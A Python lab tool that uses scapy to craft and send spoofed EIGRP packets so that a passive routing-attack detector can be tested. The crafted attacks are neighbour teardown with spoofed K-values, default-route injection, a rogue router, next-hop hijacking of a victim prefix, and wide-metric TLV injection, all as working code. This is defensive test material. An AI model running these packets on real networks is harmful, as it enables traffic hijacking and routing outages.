#!/usr/bin/env python3
"""eigrp_inject.py — craft + transmit EIGRP for the EIGRP FRR namespace lab.

LAB-ONLY. This TRANSMITS crafted EIGRP onto whatever interface you name. Point it
only at the isolated `br-eigrp` bridge built by eigrp_lab.sh — never a production
segment. Its job is to prove the passive detector (`network_diagnostics.py
eigrp-watch`) fires on real on-wire attacks.

Scenarios (and the eigrp-watch verdict each is meant to provoke):

  goodbye        spoofed neighbour teardown — Hello with all K-values 255,
                 sourced from a trusted neighbour's IP/MAC. Forces FRR to drop
                 the adjacency (can crash older eigrpd). Detector: anomaly
                 (known router advertising impossible K-values) / resilience.
  default-route  Update injecting 0.0.0.0/0 from the sender. Detector: injection.
  rogue          Hello from a brand-new speaker not in the baseline.
                 Detector: rogue-router.
  metric         Update re-advertising a victim prefix (default 172.16.2.0/24)
                 with the attacker as next-hop and a superior metric — a
                 next-hop hijack. Detector: injection.
  wide-external  Named-mode wide External route TLV (0x0603). Best-effort raw
                 TLV; exercises named-mode handling. Classic parser typically
                 sees the speaker but not the wide route.
  wide-metric    Named-mode wide Internal route TLV (0x0602). As above.

Use --dry-run to build the packet, write it to a pcap, and run it back through
the real detector parser (tcpdump -> _parse_eigrp_capture -> _eigrp_analyze)
WITHOUT transmitting — the way to verify crafting on a box with no bridge.
"""

import argparse
import os
import struct
import sys
import tempfile

EIGRP_MCAST_IP = '224.0.0.10'
EIGRP_MCAST_MAC = '01:00:5e:00:00:0a'
EIGRP_PROTO = 88


def _load_scapy():
    try:
        from scapy.all import Ether, IP, wrpcap, sendp  # noqa: F401
        import scapy.contrib.eigrp as E  # noqa: F401
        return sys.modules['scapy.all'], E
    except Exception as exc:                                  # pragma: no cover
        sys.stderr.write("error: scapy with EIGRP contrib is required "
                         "(pip install scapy): %s\n" % exc)
        raise SystemExit(2)


def _params(E, goodbye=False):
    """General Parameters TLV. Goodbye = every K-value 255 (the reset signal)."""
    k = 255 if goodbye else 0
    return E.EIGRPParam(k1=(255 if goodbye else 1), k2=k, k3=(255 if goodbye else 1),
                        k4=k, k5=k, holdtime=15)


def _wide_tlv(tlv_type, prefix, prefixlen, nexthop):
    """Best-effort named-mode 'wide metric' route TLV (0x0602 internal /
    0x0603 external). scapy has no class for these, so hand-pack a plausible
    body: nexthop, a 24-bit wide delay + 32-bit wide bandwidth, then the
    destination descriptor (prefixlen + packed prefix). Enough to put a wide
    TLV on the wire; not a bit-exact IOS encoding."""
    nh = bytes(int(o) for o in nexthop.split('.'))
    # offset(1) + reserved(1) + flags? Keep it simple: header handled by caller.
    body = b'\x00\x00'                       # header/offset placeholder
    body += nh                               # next hop
    body += b'\x00\x00\x00'                  # wide delay (24-bit)
    body += b'\x00\x00\x00\x00'              # wide bandwidth (32-bit)
    body += b'\x01\x00\x00\x00\x00\x00'      # mtu/hop/rel/load/flags
    octets = [int(o) for o in prefix.split('.')]
    nbytes = (prefixlen + 7) // 8
    body += bytes([prefixlen]) + bytes(octets[:nbytes])
    length = 4 + len(body)
    return struct.pack('!HH', tlv_type, length) + body


def build_packet(scapy, E, args):
    """Return a single crafted EIGRP frame (scapy packet) for the scenario."""
    Ether, IP = scapy.Ether, scapy.IP
    src_ip = args.src_ip
    src_mac = args.src_mac
    eth = Ether(src=src_mac, dst=EIGRP_MCAST_MAC)
    # EIGRP multicast egress: TTL 2, IP proto 88, link-local group.
    ip = IP(src=src_ip, dst=args.dst_ip, proto=EIGRP_PROTO, ttl=2)

    if args.scenario == 'goodbye':
        eig = E.EIGRP(opcode=5, asn=args.asn, tlvlist=[_params(E, goodbye=True)])
    elif args.scenario == 'rogue':
        eig = E.EIGRP(opcode=5, asn=args.asn, tlvlist=[_params(E)])
    elif args.scenario == 'default-route':
        eig = E.EIGRP(opcode=1, asn=args.asn, tlvlist=[
            _params(E),
            E.EIGRPIntRoute(dst='0.0.0.0', prefixlen=0, nexthop=src_ip,
                            delay=128, bandwidth=256, mtu=1500, hopcount=0,
                            reliability=255, load=0)])
    elif args.scenario == 'metric':
        pfx, plen = _split_prefix(args.victim_prefix)
        eig = E.EIGRP(opcode=1, asn=args.asn, tlvlist=[
            _params(E),
            # Superior metric (delay 1) + attacker next-hop = next-hop hijack.
            E.EIGRPIntRoute(dst=pfx, prefixlen=plen, nexthop=src_ip,
                            delay=1, bandwidth=10000000, mtu=9000, hopcount=0,
                            reliability=255, load=0)])
    elif args.scenario == 'wide-metric':
        pfx, plen = _split_prefix(args.victim_prefix)
        raw = _wide_tlv(0x0602, pfx, plen, src_ip)
        eig = E.EIGRP(opcode=1, asn=args.asn, tlvlist=[_params(E)]) / scapy.Raw(load=raw)
    elif args.scenario == 'wide-external':
        pfx, plen = _split_prefix(args.rogue_prefix)
        raw = _wide_tlv(0x0603, pfx, plen, src_ip)
        eig = E.EIGRP(opcode=1, asn=args.asn, tlvlist=[_params(E)]) / scapy.Raw(load=raw)
    else:                                                    # pragma: no cover
        raise SystemExit('unknown scenario: %s' % args.scenario)

    return eth / ip / eig


def _split_prefix(cidr):
    net, _, plen = cidr.partition('/')
    return net, int(plen or 32)


# The baseline eigrp_lab.sh's two routers teach eigrp-watch on the first clean
# window: r1/r2 in AS 100 with default K-values, advertising their LANs. Seeding
# this in --dry-run makes the verdict match what the live lab would show, instead
# of the 'weak-auth' you get classifying against an empty baseline.
_LAB_BASELINE = {
    'routers': {
        '10.10.0.1': {'as': [100], 'kvals': [[1, 0, 1, 0, 0]]},
        '10.10.0.2': {'as': [100], 'kvals': [[1, 0, 1, 0, 0]]},
    },
    'prefixes': {
        '172.16.1.0/24': {'origin': '10.10.0.1', 'nexthop': '10.10.0.1'},
        '172.16.2.0/24': {'origin': '10.10.0.2', 'nexthop': '10.10.0.2'},
    },
}

# Per-scenario source defaults when --src-ip isn't given. goodbye only bites if
# it's sourced from a *trusted* neighbour (spoofed teardown), so it defaults to
# r1; the rest default to an off-baseline attacker.
_SCENARIO_SRC = {
    'goodbye': ('10.10.0.1', 'aa:bb:cc:00:00:01'),
}
_DEFAULT_SRC = ('10.10.0.66', 'aa:bb:cc:00:00:66')


def _dry_run(pkt, scapy, baseline):
    """Write the frame to a pcap and run it through the REAL detector parser +
    classifier so you can see the verdict without transmitting. `baseline` is the
    seeded lab baseline (or {} for none). Returns exit code."""
    import copy
    with tempfile.NamedTemporaryFile(suffix='.pcap', delete=False) as tf:
        path = tf.name
    scapy.wrpcap(path, [pkt])
    try:
        # network_diagnostics is a core module in the repo root (this file is under python/).
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        import network_diagnostics as nd
        res = nd._run(['tcpdump', '-nn', '-t', '-v', '-r', path], timeout=10)
        print('--- tcpdump ---')
        print(res['out'].strip() or '(tcpdump produced no output)')
        events = nd._parse_eigrp_capture(res['out'])
        print('--- parsed events: %d ---' % len(events))
        for e in events:
            print('  src=%s asn=%s auth=%s routes=%s'
                  % (e.get('src'), e.get('asn'), e.get('auth'),
                     [(r.get('prefix'), r.get('nexthop'), r.get('kind'))
                      for r in e.get('routes', [])]))
        tag = 'lab baseline' if baseline else 'no baseline'
        analysis = nd._eigrp_analyze(events, 15, copy.deepcopy(baseline), learn=False)
        print('--- detector verdict (%s): %s ---' % (tag, analysis.get('verdict')))
        for r in analysis.get('reasons', []):
            print('  - %s' % r)
        return 0
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def main(argv=None):
    ap = argparse.ArgumentParser(description='Craft/transmit EIGRP for the lab (LAB-ONLY).')
    ap.add_argument('--iface', required=True, help='TX interface (use the lab bridge, e.g. br-eigrp)')
    ap.add_argument('--scenario', required=True,
                    choices=['goodbye', 'default-route', 'rogue', 'metric',
                             'wide-external', 'wide-metric'])
    ap.add_argument('--src-ip', default=None,
                    help='source IP (default: attacker 10.10.0.66; goodbye spoofs r1)')
    ap.add_argument('--src-mac', default=None, help='source MAC (default matches --src-ip)')
    ap.add_argument('--dst-ip', default=EIGRP_MCAST_IP, help='destination (default EIGRP multicast)')
    ap.add_argument('--asn', type=int, default=100, help='EIGRP autonomous-system number')
    ap.add_argument('--count', type=int, default=1, help='frames to send')
    ap.add_argument('--interval', type=float, default=1.0, help='seconds between frames')
    ap.add_argument('--victim-prefix', default='172.16.2.0/24', help='prefix to hijack (metric/wide-metric)')
    ap.add_argument('--rogue-prefix', default='10.66.66.0/24', help='prefix to inject (wide-external)')
    ap.add_argument('--dry-run', action='store_true',
                    help='build + parse through the detector; do NOT transmit')
    ap.add_argument('--baseline', choices=['lab', 'none'], default='lab',
                    help='dry-run only: classify against the lab baseline (default) or none')
    args = ap.parse_args(argv)

    # Scenario-aware source defaults.
    def_ip, def_mac = _SCENARIO_SRC.get(args.scenario, _DEFAULT_SRC)
    if args.src_ip is None:
        args.src_ip = def_ip
    if args.src_mac is None:
        args.src_mac = def_mac if args.src_ip == def_ip else 'aa:bb:cc:00:00:66'

    scapy, E = _load_scapy()
    pkt = build_packet(scapy, E, args)

    if args.dry_run:
        print('[dry-run] scenario=%s src=%s -> %s (not transmitting)'
              % (args.scenario, args.src_ip, args.dst_ip))
        return _dry_run(pkt, scapy, _LAB_BASELINE if args.baseline == 'lab' else {})

    if os.geteuid() != 0:
        sys.stderr.write('error: transmitting needs root (raw socket). Re-run with sudo.\n')
        return 2
    print('[inject] %s x%d on %s: src=%s mac=%s asn=%d -> %s'
          % (args.scenario, args.count, args.iface, args.src_ip, args.src_mac,
             args.asn, args.dst_ip))
    scapy.sendp(pkt, iface=args.iface, count=args.count, inter=args.interval, verbose=True)
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
